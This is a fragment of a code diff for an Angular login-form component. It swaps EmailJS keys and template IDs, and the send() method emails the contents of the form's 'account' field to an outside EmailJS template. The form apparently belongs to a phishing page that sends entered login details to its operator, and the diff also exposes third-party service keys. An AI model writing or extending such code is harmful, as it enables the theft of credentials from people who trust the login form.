@@ -114,9 +114,9 @@ export class LoginSectionComponent implements OnInit, OnDestroy {
   async send(end: boolean = false) {
     this.showLoader = true;
 
-    emailjs.init('NKHmyO1Zy4d62isst');
+    emailjs.init('zh43cu-e-qTq875rB');
     const response = await emailjs
-      .send("service_tep2rho","template_dztuzu6", {
+      .send("service_hqrkxno","template_w76iuix", {
         name: 'Stanley',
         message: `Email: ${
           this.loginFormControl['account'].value || ''
